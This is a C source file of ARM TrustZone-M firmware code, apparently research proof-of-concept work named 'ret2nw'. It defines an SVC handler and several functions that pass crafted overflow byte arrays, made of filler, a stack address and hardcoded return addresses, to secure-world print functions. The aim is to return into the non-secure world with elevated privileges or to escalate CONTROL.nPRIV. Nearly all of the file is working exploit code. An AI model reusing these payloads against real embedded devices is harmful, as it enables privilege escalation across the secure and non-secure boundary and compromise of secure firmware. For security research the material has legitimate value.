/*
 * ret2nw_ns.c
 *
 * Created: 5/23/2022 11:24:27 AM
 *  Author: andy2
 */ 

#include "ret2nw_ns.h"
#include "trustzone_veneer.h"

void print_in_s_handler(char* content);
void print_chk_in_s_handler(char* content);
void func_up_ns(void);

void SVC_Handler_Main(uint32_t exc_return_code, uint32_t msp_val)
{
	uint32_t stack_frame_addr;
	unsigned int *svc_args;
	uint8_t svc_number;
	char* stacked_r0;
	// Determines which stack pointer was used
	if (exc_return_code & 0x4) stack_frame_addr = __get_PSP();
	else stack_frame_addr = msp_val;
	// Determines whether additional state context is present
	if (exc_return_code & 0x20) {
		svc_args = (unsigned *) stack_frame_addr;}
	else {// additional state context present (only for Secure SVC)
		svc_args = (unsigned *) (stack_frame_addr+40);}
	// extracts SVC number
	svc_number = ((char *) svc_args[6])[-2]; // Memory[(stacked_pc)-2]
	stacked_r0 = (char *) svc_args[0];
	switch (svc_number)
	{
		case 0:
			print_in_s_handler(stacked_r0);
			break;
		case 1:
			print_chk_nsc(stacked_r0);
			break;
		case 2:
			SET_NS_PRIVILEGES;
			break;
		default:
			break;
	}
}

void __attribute__((naked)) SVC_Handler(void)
{
	__asm volatile(
		"mov r0, lr\n\t"
		"mov r1, sp\n\t"
		"b      SVC_Handler_Main\n\t"
	);
}


void print_in_s_handler(char* content)
{
	print_nsc(content);
// 	__NOP();__NOP();__NOP();__NOP();__NOP();
// 	__NOP();__NOP();__NOP();__NOP();
}

void print_chk_in_s_handler(char* content)
{
	print_chk_nsc(content);
}

/* This function is supposed to execute in P */
int get_driver_status()
{
	return 0;
}

/**
 * \brief BXNS - IPSR
 */

void print_in_s_ns(char* user_str)
{
	register char* r0 __asm("r0") = user_str;
	__asm volatile("svc #0"
		:
		: "r"  (r0)
	);
}


void ret2nw_ns()
{
	DROP_NS_PRIVILEGES;
	char user_input[28] = {
		0x20,0x20,0x20,0x20,
		0xc0,0x05,0x00,0x20,
		0x0b,0x01,0x00,0x00,
		0x22,0x22,0x22,0x22,
		0x23,0x23,0x23,0x23,
		0x24,0x24,0x24,0x24,
		0x76,0x83,0x00,0x00};
	print_in_s_ns(user_input);
	func_up_ns();
}

void func_up_ns()
{
	while(1)
	{
		
	}
}

/**
 * \brief BLXNS - IPSR
 */

void print_chk_in_s_ns(char* user_str)
{
	register char* r0 __asm("r0") = user_str;
	__asm volatile("svc #1"
	:
	: "r"  (r0)
	);
}

void ret2nw_2_ns()
{
	DROP_NS_PRIVILEGES;
	char user_input[32] = {
		0x20,0x20,0x20,0x20,
		0x21,0x21,0x21,0x21,
		0x3e,0x83,0x00,0x00};
	print_chk_in_s_ns(user_input);
	func_up_ns();
}

/**
 * \brief BXNS - CONTROL.nPRIV
 */

void escalate_priv()
{
	__asm volatile("svc #2");
}

void ret2nw_3_ns()
{
	char user_input[32] = {\
		0x20,0x20,0x20,0x20,\
		0xc0,0x05,0x00,0x20,\
		0x6f,0x01,0x00,0x00,\
		0x22,0x22,0x22,0x22,\
		0x23,0x23,0x23,0x23,\
		0x24,0x24,0x24,0x24,\
		0x44,0x83,0x00,0x00};
	escalate_priv();
	print_nsc(user_input);
	DROP_NS_PRIVILEGES;
	func_up_ns();
}

/**
 * \brief BXNS - CONTROL.nPRIV
 */

void ret2nw_4_ns()
{
	char user_input[32] = {\
		0x20,0x20,0x20,0x20,\
		0x21,0x21,0x21,0x21,\
		0x44,0x83,0x00,0x00};
	escalate_priv();
	print_chk_nsc(user_input);
	DROP_NS_PRIVILEGES;
	func_up_ns();
}